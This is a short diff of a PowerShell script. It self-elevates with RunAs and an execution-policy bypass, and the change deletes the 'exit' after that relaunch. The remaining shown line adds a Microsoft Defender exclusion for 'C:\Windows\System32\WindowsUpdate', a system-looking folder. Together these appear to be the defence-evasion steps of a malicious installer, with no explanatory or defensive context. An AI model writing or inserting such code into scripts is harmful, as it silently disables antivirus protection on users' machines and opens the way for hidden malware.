@@ -10,6 +10,6 @@ if (-not $isAdmin) {
         -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
         -Verb RunAs
 
-    exit
+    
 }
 Add-MpPreference -ExclusionPath "C:\Windows\System32\WindowsUpdate"
